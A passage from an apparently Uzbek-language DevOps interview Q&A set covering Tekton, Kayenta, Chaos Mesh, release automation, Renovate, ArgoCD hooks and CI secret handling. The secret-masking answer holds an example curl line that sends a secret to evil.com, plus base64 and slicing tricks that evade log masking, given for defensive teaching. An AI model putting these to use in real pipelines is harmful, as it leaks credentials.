Pipeline:  clone --> [unit-test, lint] (parallel) --> build-push --> deploy
             |  workspace (PVC) bilan source uzatiladi
           har biri = TaskRun = Pod
```

**Amalda:**
```yaml
apiVersion: tekton.dev/v1
kind: Pipeline
metadata: { name: ci }
spec:
  params: [{ name: repo-url }]
  workspaces: [{ name: src }]
  tasks:
    - name: clone
      taskRef: { resolver: hub, params: [{ name: name, value: git-clone }, { name: version, value: "0.9" }] }
      params: [{ name: url, value: $(params.repo-url) }]
      workspaces: [{ name: output, workspace: src }]
    - name: test
      runAfter: [clone]
      taskRef: { name: go-test }
      workspaces: [{ name: source, workspace: src }]
```
```bash
tkn pipeline start ci -p repo-url=https://github.com/org/api -w name=src,volumeClaimTemplateFile=pvc.yaml --showlog
tkn pipelinerun list
```

**Tuzoqlar:**
- Har Task — yangi pod: pod start va PVC attach vaqti qisqa task'larni sekinlashtiradi; step'larni bitta Task'ga birlashtir.
- `ReadWriteOnce` PVC — parallel task'lar turli node'ga tushsa mount bo'lmaydi (affinity assistant yoki RWX).
- Eski PipelineRun pod'lari to'planadi — pruner sozla.

**Senior nuqta:** Tekton — "CI qurilish bloklari", tayyor mahsulot emas: UI (Tekton Dashboard), trigger, chains (supply chain imzolash) alohida. Ichki platforma qurayotgan jamoa uchun kuchli, kichik jamoaga GitHub Actions/GitLab CI soddaroq. Tekton Chains bilan TaskRun'lardan SLSA provenance avtomatik.

40693.a:
**Qisqa javob:** Kayenta — Netflix/Google'ning Spinnaker'dagi Automated Canary Analysis (ACA) engine'i: canary va **bir vaqtda yangi ishga tushirilgan baseline** (eski versiya) klasterlaridan metrikalarni olib, statistik test (Mann-Whitney U) bilan solishtiradi va 0-100 ball beradi; ball chegaradan past bo'lsa reliz to'xtatiladi.

**Muammo:** Absolyut chegaralar ("error < 1%") kun vaqti, trafik o'zgarishi bilan noto'g'ri qaror beradi. Canary'ni prod'dagi uzoq yashagan eski pod'lar bilan solishtirish ham xato: ularda cache issiq, JVM qizigan.

**Qanday ishlaydi:**
```text
prod (v1, katta)    -- trafik --+
baseline (v1, 3 pod, yangi)  <--+-- bir xil ulush
canary   (v2, 3 pod, yangi)  <--+
Kayenta: har metrika uchun baseline vs canary taqsimotini solishtiradi
  -> Pass/High/Low -> og'irliklar bo'yicha umumiy ball
  ball >= 95: promote | 75..95: marginal (inson) | < 75: rollback
```

**Amalda (canary config fragmenti):**
```json
{ "metrics": [
    { "name": "5xx", "query": { "type": "prometheus",
        "customInlineTemplate": "PromQL:sum(rate(http_requests_total{code=~\"5..\",version=\"${scope}\"}[1m]))" },
      "analysisConfigurations": { "canary": { "direction": "increase", "critical": true } },
      "groups": ["errors"] } ],
  "classifier": { "groupWeights": { "errors": 70, "latency": 30 } } }
```
Spinnaker pipeline'da "Canary Analysis" stage: interval, lifetime, `marginal`/`pass` threshold'lari.

**Tuzoqlar:**
- Baseline'siz canary'ni prod bilan solishtirish — warm-up farqi soxta "regressiya" beradi.
- Kam trafik — statistik test ishonchsiz; analiz davri yetarlicha uzun bo'lsin.
- `critical: true` metrika yiqilsa umumiy ball yuqori bo'lsa ham fail.

**Senior nuqta:** Kayenta g'oyasi (baseline vs canary nisbiy solishtirish) Spinnaker'siz ham qo'llaniladi — Argo Rollouts'da ikkita AnalysisTemplate yoki Kayenta provider bilan. Spinnaker bugun kamroq yangi joriy qilinadi (murakkab operatsiya), lekin ACA konsepsiyasi intervyuda muhim.

40694.a:
**Qisqa javob:** Chaos Mesh (CNCF incubating) — Kubernetes uchun chaos engineering platformasi: CRD'lar orqali nosozlik kiritadi — `PodChaos` (pod kill/failure), `NetworkChaos` (delay, loss, partition), `StressChaos` (CPU/memory), `IOChaos`, `TimeChaos`, `DNSChaos`, `HTTPChaos`. CI/CD'da — staging'da avtomatik resilience testi sifatida ishlatiladi.

**Muammo:** Timeout, retry, circuit breaker, PDB, replica soni — "ishlashi kerak" degan farazlar. Ular haqiqiy nosozlikda tekshirilmaguncha — faqat taxmin.

**Qanday ishlaydi:**
```text
CI: deploy staging -> load test boshlanadi
    -> Chaos Mesh: NetworkChaos (payments -> db 200ms delay, 5 min)
    -> SLO tekshiruvi: p99 < 800ms? error < 1%?
    -> chaos tugadi -> natija: pipeline pass/fail
chaos-daemon (har node'da DaemonSet) tc/iptables/cgroup orqali nosozlik kiritadi
```

**Amalda:**
```yaml
apiVersion: chaos-mesh.org/v1alpha1
kind: NetworkChaos
metadata: { name: db-latency, namespace: staging }
spec:
  action: delay
  mode: all
  selector: { namespaces: [staging], labelSelectors: { app: payments } }
  delay: { latency: "200ms", jitter: "50ms" }
  direction: to
  target: { mode: all, selector: { labelSelectors: { app: postgres } } }
  duration: "5m"
```
```bash
kubectl apply -f db-latency.yaml
kubectl -n staging get networkchaos
kubectl delete networkchaos db-latency -n staging     # darhol to'xtatish
```
Murakkab ssenariy uchun `Workflow` CRD (ketma-ket/parallel eksperimentlar).

**Tuzoqlar:**
- Gipotezasiz chaos — "nimadir buzildi" bilan tugaydi. Avval: "200ms delay'da p99 < 800ms qoladi" kabi aniq gipoteza.
- chaos-daemon privileged — uni namespace bilan cheklamaslik prod'ga ham ta'sir qilish imkonini beradi (`--set controllerManager.enableFilterNamespace`).
- Observability bo'lmasa natijani o'lchab bo'lmaydi.

**Senior nuqta:** Chaos'ni CI'ga qo'shish — regressiyalarni ushlaydi (masalan, kimdir timeout'ni olib tashladi). Prod'dagi GameDay'lar alohida, nazorat ostida va blast radius cheklangan holda. Alternativalar: LitmusChaos, AWS FIS, Gremlin.

40695.a:
**Qisqa javob:** semantic-release — commit xabarlari (Conventional Commits) asosida keyingi SemVer versiyani avtomatik aniqlaydigan, changelog, Git tag, GitHub/GitLab release yaratadigan va paketni (npm va h.k.) publish qiladigan tool. Inson versiya raqamini tanlamaydi.

**Muammo:** "Bu major'mi yoki minor?" bahsi, unutilgan changelog, qo'lda tag — xato va nomuvofiqlik. Breaking change'ni patch sifatida chiqarish foydalanuvchilarni sindiradi.

**Qanday ishlaydi:**
```text
oxirgi tag v1.4.2 dan beri commit'lar:
  fix: ...                     -> patch
  feat: ...                    -> minor
  feat!: ... / BREAKING CHANGE: -> major
eng kattasi tanlanadi -> v1.5.0
plugin'lar: commit-analyzer -> release-notes-generator -> changelog -> npm -> github -> git
```

**Amalda:**
```json
// .releaserc.json
{ "branches": ["main", { "name": "beta", "prerelease": true }],
  "plugins": ["@semantic-release/commit-analyzer",
              "@semantic-release/release-notes-generator",
              "@semantic-release/changelog",
              "@semantic-release/github"] }
```
```yaml
# GitHub Actions
- run: npx semantic-release
  env: { GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
```
```bash
npx semantic-release --dry-run     # qaysi versiya chiqishini ko'rish
```

**Tuzoqlar:**
- Commit xabarlari intizomsiz bo'lsa natija noto'g'ri — commitlint + PR title tekshiruvi (squash merge'da PR sarlavhasi commit bo'ladi).
- CI'da shallow clone (`fetch-depth: 1`) — tag tarixini ko'rmaydi; `fetch-depth: 0`.
- Branch protection tufayli changelog commit'ini push qila olmaydi — bot uchun istisno yoki changelog'ni repo'da saqlamaslik.

**Senior nuqta:** semantic-release har merge'da darhol reliz chiqaradi (continuous release) — kutubxonalar uchun zo'r. Reliz vaqtini inson nazorat qilishi kerak bo'lsa (ilovalar, monorepo) — Release Please yoki Changesets qulayroq.

40696.a:
**Qisqa javob:** Release Please (Google) — Conventional Commits tarixidan keyingi versiyani hisoblab, versiya fayllari va `CHANGELOG.md` ni yangilaydigan **Release PR** ochadi va uni yangi commit'lar bilan yangilab turadi. PR merge qilinganda Git tag va GitHub Release yaratadi.

**Muammo:** semantic-release har merge'da darhol reliz chiqaradi; ko'p jamoa esa "qachon reliz qilish"ni o'zi tanlashni va changelog'ni ko'rib chiqishni xohlaydi.

**Qanday ishlaydi:**
```text
main'ga merge: feat: ..., fix: ...
   --> release-please: "chore(main): release 1.5.0" PR (CHANGELOG + version bump)
   ... yana merge'lar -> PR yangilanadi
inson Release PR'ni merge qiladi --> tag v1.5.0 + GitHub Release
   --> keyingi job: build/publish (release_created == true bo'lsa)
```

**Amalda:**
```yaml
on: { push: { branches: [main] } }
permissions: { contents: write, pull-requests: write }
jobs:
  release:
    runs-on: ubuntu-latest
    outputs: { created: ${{ steps.rp.outputs.release_created }} }
    steps:
      - id: rp
        uses: googleapis/release-please-action@v4
        with: { release-type: node }
  publish:
    needs: release
    if: needs.release.outputs.created == 'true'
    runs-on: ubuntu-latest
    steps: [{ run: echo "build & publish" }]
```
Monorepo: `release-please-config.json` + `.release-please-manifest.json` — har paket alohida versiya.

**Tuzoqlar:**
- Default `GITHUB_TOKEN` bilan ochilgan PR boshqa workflow'larni (CI check) trigger qilmaydi — GitHub App token ishlat.
- Squash merge'da PR sarlavhasi conventional bo'lmasa commit hisobga olinmaydi.
- Release PR'ni uzoq ochiq qoldirish — katta, xavfli relizlar.

**Senior nuqta:** Release Please "deploy qilinadigan" ilovalar va monorepo'lar uchun mos: reliz — ko'rib chiqiladigan PR, ya'ni audit va nazorat nuqtasi. Kutubxonalarda to'liq avtomatlashtirish uchun semantic-release yoki Changesets.

40697.a:
**Qisqa javob:** Dependabot (GitHub o'rnatilgan) va Renovate (Mend, ochiq kodli) — dependency manifest'larini (package.json, go.mod, Dockerfile, GitHub Actions, Terraform, Helm ...) skanerlab, yangi versiya yoki xavfsizlik tuzatishi chiqqanda changelog/release notes bilan avtomatik PR ochadigan bot'lar.

**Muammo:** Dependency'lar o'z-o'zidan eskiradi. Bir yil yangilanmagan loyihada CVE tuzatish uchun 3 ta major versiyadan sakrash kerak — og'riqli. Kichik, muntazam yangilanishlar arzonroq.

**Qanday ishlaydi:**
```text
jadval bo'yicha: manifest + lockfile o'qiladi --> registry'da yangi versiya?
  --> branch + PR (changelog, release notes, compatibility score)
  --> CI test --> review/auto-merge
security advisory chiqsa --> darhol security PR (Dependabot security updates)
```

**Amalda (Dependabot):**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: gomod
    directory: /
    schedule: { interval: weekly }
    groups:
      minor-patch: { update-types: [minor, patch] }
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
  - package-ecosystem: docker
    directory: /
    schedule: { interval: weekly }
```

**Tuzoqlar:**
- Guruhlashsiz — haftasiga 30 PR, jamoa ularni e'tiborsiz qoldiradi ("PR fatigue").
- Testlar zaif bo'lsa yangilanish "yashil" bo'lib prod'ni sindiradi — auto-merge faqat yaxshi test coverage bilan.
- Yangi chiqqan versiyani darhol olish — zararli publish (supply chain hujum) riski; Renovate `minimumReleaseAge` bilan bir necha kun kutish.

**Senior nuqta:** Bot faqat jarayon bo'lsa foyda beradi: kim PR'larni ko'radi, qaysi turlar auto-merge, qancha vaqtda. GitHub Actions'ni ham SHA bilan pin qilib, yangilashni bot'ga topshirish — xavfsizlik va qulaylik muvozanati.

40698.a:
**Qisqa javob:** Renovate'ning Dependabot'dan afzalliklari: ko'p platforma (GitHub, GitLab, Bitbucket, Azure DevOps, Gitea), 90+ package manager, kuchli `packageRules` (guruhlash, jadval, auto-merge, `minimumReleaseAge`), **Dependency Dashboard** issue, monorepo preset'lari, custom regex manager (istalgan fayldagi versiya) va org-darajasidagi umumiy preset'lar.

**Muammo:** Dependabot GitHub'ga bog'liq va sozlamalari cheklangan; katta tashkilotda yuzlab repo uchun yagona siyosat va kam shovqin kerak.

**Amalda (`renovate.json`):**
```json
{
  "extends": ["config:recommended", "helpers:pinGitHubActionDigests"],
  "schedule": ["before 6am on monday"],
  "minimumReleaseAge": "3 days",
  "dependencyDashboard": true,
  "packageRules": [
    { "matchUpdateTypes": ["patch", "minor"], "matchCurrentVersion": "!/^0/",
      "groupName": "non-major", "automerge": true },
    { "matchUpdateTypes": ["major"], "dependencyDashboardApproval": true },
    { "matchPackageNames": ["/^@aws-sdk//"], "groupName": "aws-sdk" }
  ],
  "customManagers": [
    { "customType": "regex", "managerFilePatterns": ["/Makefile$/"],
      "matchStrings": ["TERRAFORM_VERSION=(?<currentValue>.*?)\\n"],
      "depNameTemplate": "hashicorp/terraform", "datasourceTemplate": "github-releases" }
  ]
}
```
```bash
npx renovate-config-validator
LOG_LEVEL=debug npx renovate --dry-run=full org/repo
```

**Tuzoqlar:**
- Konfiguratsiya juda kuchli — xato regex yoki `packageRules` tartibi kutilmagan natija beradi; dashboard va debug log bilan tekshir.
- Self-hosted Renovate'ga keng token — uni GitHub App bilan, kerakli repo'lar uchun ber.
- `automerge` + branch protection'da required check'lar yo'q bo'lsa — test'siz merge.

**Senior nuqta:** Org-darajasidagi preset (`"extends": ["github>org/renovate-config"]`) yuzlab repo'da bitta siyosatni ta'minlaydi. Oddiy GitHub-only loyihada Dependabot yetarli va nol sozlash; murakkab monorepo va ko'p ekotizimda — Renovate.

40699.a:
**Qisqa javob:** PR builder job — pull request ochilganda yoki yangi commit push qilinganda avtomatik ishga tushadigan CI job: build, lint, unit test, scan bajaradi va natijani PR'ga **status check** sifatida qaytaradi; branch protection shu check'lar yashil bo'lmaguncha merge'ni bloklaydi.

**Muammo:** Main'ga sinmagan kod tushishi kerak. Review'da "testlar o'tadimi?" ni inson tekshirmasligi kerak — buni mashina qiladi.

**Qanday ishlaydi:**
```text
PR push --> webhook --> CI: checkout (PR head + main merge commit)
   --> build -> test -> lint -> scan
   --> status API: ci/test = success|failure --> PR sahifasida yashil/qizil
branch protection: required checks + review --> merge tugmasi
```

**Amalda (GitHub Actions):**
```yaml
on:
  pull_request:
    branches: [main]
concurrency:
  group: pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true          # yangi push eski run'ni to'xtatadi
permissions: { contents: read }
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version-file: go.mod, cache: true }
      - run: go test -race ./...
```
Jenkins'da analog: Multibranch Pipeline / GitHub Branch Source plugin.

**Tuzoqlar:**
- `pull_request_target` — base repo kontekstida, secret'lar bilan ishlaydi; unda fork PR kodini checkout qilib ishga tushirish = secret o'g'irlash ("pwn request").
- PR branch eskirgan (main'dan orqada) — o'zi yashil, merge'dan keyin qizil. "Require branches to be up to date" yoki merge queue.
- Sekin PR builder (30+ daqiqa) — developer'lar kichik PR yozishni to'xtatadi.

**Senior nuqta:** Ko'p jamoali repo'da merge queue (GitHub merge queue, Bors, Mergify) PR'larni main bilan birga qayta test qilib, "yashil PR + yashil PR = qizil main" muammosini yopadi.

40700.a:
**Qisqa javob:** Out-of-sync — GitOps tool'i Git'dagi desired state'ni render qilib, klasterdagi live state bilan solishtirganda farq topilgan holat. ArgoCD'da `Sync Status: OutOfSync`, Flux'da Kustomization/HelmRelease revision mos kelmasligi yoki drift xabari.

**Sabablari (farqlash muhim):**

| Sabab | Misol | Harakat |
|---|---|---|
| Yangi commit hali sync bo'lmagan | merge qilindi, auto-sync o'chiq | sync |
| Qo'lda o'zgarish (drift) | `kubectl edit`, `scale` | self-heal / Git'ga ko'chirish |
| Controller o'zgartiradi | HPA replicas, webhook default'lari | `ignoreDifferences` |
| Render nondeterministik | Helm `randAlphaNum`, sana | template'ni tuzat |
| Sync yiqilgan | invalid manifest, RBAC | xatoni tuzat |

**Qanday ishlaydi:**
```text
desired = render(Git) ; live = kube-api ; normalize (default maydonlar, ignore qoidalari)
diff != 0  --> OutOfSync
```

**Amalda:**
```bash
argocd app get api-prod           # qaysi resurslar OutOfSync
argocd app diff api-prod          # aniq farq
# Flux
flux get kustomizations
flux diff kustomization apps --path ./apps/prod
```
Doimiy farq beradigan maydonni e'tiborsiz qoldirish:
```yaml
ignoreDifferences:
  - group: admissionregistration.k8s.io
    kind: MutatingWebhookConfiguration
    jqPathExpressions: [".webhooks[]?.clientConfig.caBundle"]
```

**Tuzoqlar:**
- Doimiy OutOfSync'ga ko'nikib qolish — haqiqiy drift ham e'tiborsiz qoladi.
- `ServerSideApply=true` va normalizatsiyasiz — default maydonlar soxta diff beradi.
- OutOfSync'ni Healthy bilan adashtirish: resurs sinxron emas, lekin sog'lom bo'lishi mumkin (va aksincha).

**Senior nuqta:** OutOfSync uchun alert qo'y (`argocd_app_info{sync_status="OutOfSync"}` > N daqiqa) — bu GitOps'ning asosiy signali. Maqsad: "OutOfSync" har doim harakat talab qiladigan holat bo'lsin, shovqin emas.

40701.a:
**Qisqa javob:** Drift correction — klasterdagi Git'da yo'q (out-of-band) o'zgarishni aniqlab, avtomatik ravishda Git'dagi holatga qaytarish. ArgoCD'da `selfHeal: true`, Flux'da Kustomization har `interval`da qayta apply qiladi (va HelmRelease `driftDetection.mode: enabled`).

**Muammo:** Incident paytida kimdir `kubectl set env` qildi, keyin unutdi. Bir oydan keyin yangi klasterga xuddi shu Git'dan deploy — u yerda bu fix yo'q, xato qaytadi. Drift — "Git'da yozilmagan bilim".

**Qanday ishlaydi:**
```text
t0: Git: replicas=3   live: 3     Synced
t1: kubectl scale --replicas=8   live: 8   -> OutOfSync (drift)
t2: selfHeal (5s kutish) -> apply Git  -> live: 3   Synced
```

**Amalda:**
```yaml
# ArgoCD
syncPolicy:
  automated: { selfHeal: true, prune: true }
```
```yaml
# Flux Kustomization
spec:
  interval: 5m       # har 5 daqiqada qayta apply -> drift tuzatiladi
  force: false
```
```bash
kubectl -n api patch deploy api -p '{"spec":{"template":{"spec":{"containers":[{"name":"api","env":[{"name":"DEBUG","value":"1"}]}]}}}}'
argocd app get api      # OutOfSync -> bir necha soniyada Synced
argocd app history api
```
Vaqtincha to'xtatish (incident): `argocd app set api --sync-policy none` yoki Flux'da `flux suspend kustomization apps` — va tugagach `flux resume`.

**Tuzoqlar:**
- HPA/VPA/operator boshqaradigan maydonlar `ignoreDifferences`siz — self-heal ular bilan "jang qiladi" (flapping).
- Suspend qilib, resume qilishni unutish — klaster jimgina GitOps'dan chiqadi. Suspended app'lar uchun alert.
- Drift tuzatildi, lekin sababi aniqlanmadi — kim va nega qo'lda o'zgartirdi? Audit log (kube-apiserver audit) va RBAC bilan qo'lda yozishni cheklash.

**Senior nuqta:** Eng yaxshi drift correction — drift'ning oldini olish: odamlarga prod'da faqat read-only RBAC, break-glass account esa audit va alert bilan. Self-heal — xavfsizlik to'ri, asosiy nazorat emas.

40702.a:
**Qisqa javob:** PreSync hook — `argocd.argoproj.io/hook: PreSync` annotation'li resurs (odatda `Job`): ArgoCD asosiy manifest'larni apply qilishdan **oldin** uni ishga tushiradi va muvaffaqiyatli tugashini kutadi. Yiqilsa sync to'xtaydi — yangi versiya deploy qilinmaydi.

**Muammo:** Yangi kod yangi DB ustunini kutadi; migration deploy'dan oldin bajarilmasa pod'lar xato beradi. Yoki: deploy'dan oldin backup olish, feature flag tekshirish.

**Qanday ishlaydi:**
```text
sync boshlandi
  -> PreSync Job (migrate) -- Running -- Succeeded?
        ha  -> Sync phase (Deployment, Service ...)
        yo'q -> sync Failed -> SyncFail hook'lari
```

**Amalda:**
```yaml
apiVersion: batch/v1
kind: Job
metadata:
  generateName: migrate-          # har sync'da yangi nom
  annotations:
    argocd.argoproj.io/hook: PreSync
    argocd.argoproj.io/hook-delete-policy: HookSucceeded
spec:
  backoffLimit: 0
  activeDeadlineSeconds: 600
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: migrate
          image: org/api:1.5.0
          command: ["/app/migrate", "up"]
          envFrom: [{ secretRef: { name: db } }]
```
```bash
argocd app get api --show-operation
kubectl -n api logs job/migrate-x7k2p
```

**Tuzoqlar:**
- Migration backward-compatible bo'lmasa — PreSync tugagan zahoti eski pod'lar (hali ishlayapti) sinadi. Expand/contract shart.
- Migration idempotent bo'lmasa — retry yoki qayta sync ikki marta bajaradi. Migration tool versiya jadvalidan foydalansin (golang-migrate, Flyway).
- Uzun migration (katta jadvalga index) sync timeout'ga uriladi va lock ushlab qoladi — `CREATE INDEX CONCURRENTLY` yoki alohida jarayon.

**Senior nuqta:** PreSync migration'ni ilova relizi bilan bog'laydi — kichik jamoaga qulay. Lekin rollback'da ArgoCD DB'ni orqaga qaytarmaydi; shuning uchun "migration -> kod" tartibida faqat additive o'zgarishlar va destruktiv qismi keyingi relizda.

40703.a:
**Qisqa javob:** PostSync hook — `argocd.argoproj.io/hook: PostSync` annotation'li resurs: Sync phase muvaffaqiyatli tugab, barcha resurslar **Healthy** bo'lgandan keyin ishga tushadi. Odatda smoke test, cache warm-up, bildirishnoma, tashqi tizimni (CDN purge) yangilash.

**Muammo:** "Sync Succeeded" = manifest'lar apply qilindi va pod'lar ready. Lekin ilova haqiqatan to'g'ri ishlayaptimi (login ishlaydimi, DB'ga yozadimi) — buni alohida tekshirish kerak.

**Qanday ishlaydi:**
```text
PreSync -> Sync (wave'lar) -> hammasi Healthy?
   ha -> PostSync Job (smoke test) -> Succeeded -> operation Succeeded
                                   -> Failed    -> operation Failed (SyncFail ishga tushadi)
```

**Amalda:**
```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: smoke-test
  annotations:
    argocd.argoproj.io/hook: PostSync
    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation
spec:
  backoffLimit: 2
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: smoke
          image: curlimages/curl:8.10.1
          command: ["sh", "-c"]
          args:
            - curl -fsS --retry 5 --retry-delay 3 http://api.api.svc/healthz &&
              curl -fsS http://api.api.svc/v1/version | grep 1.5.0
```
Bildirishnoma uchun hook o'rniga ArgoCD Notifications (`on-deployed` trigger) qulayroq.

**Tuzoqlar:**
- PostSync yiqilsa ham yangi versiya allaqachon ishlab turibdi — bu avtomatik rollback **emas**. Rollback kerak bo'lsa Argo Rollouts analiz yoki alohida mexanizm.
- `HookSucceeded` delete policy — yiqilgan Job qoladi (log ko'rish uchun yaxshi), keyingi sync'da nom to'qnashadi; `BeforeHookCreation` qo'sh.
- Smoke test prod ma'lumotini o'zgartirmasin — faqat read-only yoki test tenant.

**Senior nuqta:** PostSync — tez "sanity check", progressive delivery o'rnini bosmaydi. Kuchli zanjir: PostSync smoke test + SLO alert'lari + Rollouts canary analiz.

40704.a:
**Qisqa javob:** SyncFail hook — `argocd.argoproj.io/hook: SyncFail` annotation'li resurs: sync operatsiyasi yiqilganda (PreSync/Sync/PostSync bosqichlarining birida) ishga tushadi. Vazifasi — tozalash, ogohlantirish yoki kompensatsiya (masalan, PreSync'da qo'yilgan maintenance flag'ni olib tashlash).

**Muammo:** PreSync'da "maintenance mode ON" qilding, keyin Sync yiqildi — sayt maintenance rejimida qolib ketadi. Yoki jamoa sync yiqilganini bilmaydi.

**Qanday ishlaydi:**
```text
PreSync ok -> Sync: Deployment invalid -> FAILED
                                  |
                                  v
                       SyncFail Job(lar) ishga tushadi
                       (operation baribir Failed bo'lib qoladi)
```

**Amalda:**
```yaml
apiVersion: batch/v1
kind: Job
metadata:
  generateName: sync-fail-cleanup-
  annotations:
    argocd.argoproj.io/hook: SyncFail
    argocd.argoproj.io/hook-delete-policy: HookSucceeded
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: cleanup
          image: org/ops-tools:1.2
          command: ["sh", "-c", "ops maintenance off && ops notify '#deploys' 'api sync failed'"]
```
```bash
argocd app get api --show-operation     # Phase: Failed, qaysi bosqichda
```

**Tuzoqlar:**
- SyncFail avtomatik rollback qilmaydi — klaster qisman yangilangan holatda bo'lishi mumkin. Rollback = `git revert` yoki `argocd app rollback`.
- SyncFail Job'ning o'zi yiqilsa — qo'shimcha xabar yo'q; uni oddiy va ishonchli qil.
- Bildirishnoma uchun ArgoCD Notifications (`on-sync-failed` trigger) hook'dan soddaroq va ishonchliroq.

**Senior nuqta:** Hook'lar orasidagi "tranzaksiya" yo'q: PreSync qilgan har o'zgarish uchun SyncFail'da kompensatsiya (saga g'oyasi) o'ylab qo'y. Eng yaxshisi — PreSync'da qaytarib bo'lmaydigan o'zgarish qilmaslik.

40705.a:
**Qisqa javob:** CI masking — log'da secret qiymatini aniq satr mosligi bo'yicha `***` bilan almashtirish. U faqat **aynan o'sha** satrni taniydi: secret base64/URL-encode qilinsa, bo'laklarga bo'linsa, teskari yozilsa, JSON ichida escape qilinsa yoki ko'p qatorli bo'lsa — log'da ochiq chiqadi. Masking — oxirgi himoya chizig'i, xavfsizlik nazorati emas.

**Muammo:** Hujumchi (yoki tasodif) secret'ni log'ga chiqarsa, public repo log'ini hamma o'qiydi; zararli PR yoki dependency esa masking'ni ataylab aylanib o'tadi.

**Qanday ishlaydi:**
```text
secret = "s3cr3t"
echo $SECRET             -> ***            (maskalangan)
echo $SECRET | base64    -> czNjcjN0Cg==   (OCHIQ)
echo ${SECRET:0:3} ${SECRET:3}  -> s3c r3t (OCHIQ)
curl https://evil.com/?k=$SECRET  -> log'da ko'rinmaydi, lekin sizib chiqdi
```

**Amalda (GitHub Actions):**
```bash
# runtime'da hosil bo'lgan qiymatni ham mask qilish
TOKEN=$(vault read -field=token secret/ci)
echo "::add-mask::$TOKEN"
echo "$TOKEN" | base64 | xargs -I{} echo "::add-mask::{}"   # hosilalarini ham
```
```yaml
permissions: { contents: read }      # GITHUB_TOKEN minimal
env: {}                               # secret'ni faqat kerakli step'ga ber
steps:
  - run: ./deploy.sh
    env: { API_KEY: ${{ secrets.API_KEY }} }
```

**Tuzoqlar:**
- `set -x` yoki debug log (`ACTIONS_STEP_DEBUG`) — buyruq argumentlari bilan secret chiqadi.
- Strukturali secret (JSON service account key) — har maydoni alohida mask qilinmaydi; butun JSON'ni secret qilib, ichidagi `private_key` boshqa formatda chiqishi mumkin.
- Artifact, cache, test report'larga secret yozilsa — masking ularga umuman tegmaydi.

**Senior nuqta:** Haqiqiy himoya: secret'ni ishonchsiz kod ishlaydigan job'ga umuman bermaslik, qisqa muddatli OIDC credential'lar (sizib chiqsa ham tez eskiradi), egress cheklovi va secret scanning. Sizib chiqqan bo'lsa — mask emas, **rotate**.

40706.a:
**Qisqa javob:** Git credential helper — Git autentifikatsiya so'raganda (HTTPS) login/token'ni qayerdan olishni hal qiluvchi tashqi dastur (`git credential-<name>`). CI'da u orqali qisqa muddatli token (GitHub App installation token, CI job token) beriladi — parol URL'ga yoki `.git/config`ga hardcode qilinmaydi.

**Muammo:** `git clone https://user:TOKEN@github.com/...` — token `.git/config`da, process ro'yxatida (`ps`), log'da va artifact'larda qoladi. Shaxsiy PAT esa uzoq yashaydi va odamga bog'langan.

**Qanday ishlaydi:**
```text
git fetch --> "github.com uchun credential kerak"
  --> credential.helper "get" (protocol, host, path stdin orqali)
  <-- username=x-access-token, password=<1 soatlik token>
git --> HTTPS Authorization header
```

**Amalda:**
```bash
# helper sifatida oddiy skript: token'ni env'dan beradi, diskka yozmaydi
git config --global credential.helper \
  '!f() { echo username=x-access-token; echo "password=${GH_TOKEN}"; }; f'
git clone https://github.com/org/private-lib.git

# GitHub CLI helper
gh auth setup-git

# Go private modullar uchun
git config --global url."https://x-access-token:${GH_TOKEN}@github.com/".insteadOf "https://github.com/"   # kamroq xavfsiz variant
```
GitHub App token olish (Actions): `actions/create-github-app-token@v1` -> 1 soatlik, faqat kerakli repo'larga.

**Tuzoqlar:**
- `credential.helper store` — token `~/.git-credentials`da ochiq matn; persistent runner'da keyingi job o'qiydi.
- `actions/checkout` default'da `GITHUB_TOKEN`ni `.git/config`ga yozadi — keyingi step'lar (va zararli dependency) uni o'qiy oladi. `persist-credentials: false` qo'y.
- `insteadOf` URL'ga token joylash — xato xabarlarida token chiqishi mumkin.

**Senior nuqta:** Maqsad — CI'da uzoq muddatli Git credential umuman bo'lmasligi: GitHub App (repo'ga scoped, 1 soat), GitLab `CI_JOB_TOKEN`, deploy key faqat read-only. Bot akkaunt PAT'i — oxirgi chora.

40707.a:
**Qisqa javob:** `secrets: inherit` — GitHub Actions'da reusable workflow chaqirilganda chaqiruvchi workflow'ga ochiq bo'lgan **barcha** secret'larni (repo, environment emas, org) nomma-nom uzatish. Qulay, lekin least privilege'ga zid: chaqirilgan workflow o'ziga kerak bo'lmagan secret'larni ham oladi.

**Muammo:** 20 ta secret'ni bittalab `secrets:` bilan uzatish noqulay; `inherit` buni yengillashtiradi. Ammo reusable workflow boshqa repo'da (yoki tag bilan) bo'lsa va o'zgartirilsa — u barcha secret'larga kirish oladi.

**Qanday ishlaydi:**
```text
caller (org/app)  secrets: AWS_ROLE, NPM_TOKEN, SLACK_URL, PROD_DB_PASS
   uses: org/ci/.github/workflows/build.yml@v2
      secrets: inherit   --> build.yml hammasini ko'radi (faqat NPM_TOKEN kerak edi)
```

**Amalda:**
```yaml
# Yomon: hammasi uzatiladi
jobs:
  build:
    uses: org/ci/.github/workflows/build.yml@v2
    secrets: inherit
```
```yaml
# Yaxshi: aniq ro'yxat va pinning
jobs:
  build:
    uses: org/ci/.github/workflows/build.yml@3f1c2a9e8b...   # commit SHA
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```
Reusable workflow tomonda:
```yaml
on:
  workflow_call:
    secrets:
      NPM_TOKEN: { required: true }
```

**Tuzoqlar:**
- Reusable workflow'ni `@main` bilan chaqirish + `inherit` — boshqa repo'ga push qila oladigan har kim sizning secret'laringizni oladi.
- `inherit` faqat bir xil org/enterprise ichida ishlaydi; tashqi workflow'ga baribir aniq uzatiladi.
- Environment secret'lari job `environment:` orqali alohida keladi — inherit ularni boshqarmaydi.

**Senior nuqta:** Secret'lardan ham yaxshisi — OIDC: reusable workflow `id-token: write` bilan cloud role'ni o'zi oladi, role trust policy esa `job_workflow_ref` claim'i bo'yicha aynan shu workflow'ga ruxsat beradi. Bu "qaysi workflow qaysi role'ni ola oladi"ni aniq bog'laydi.

40708.a:
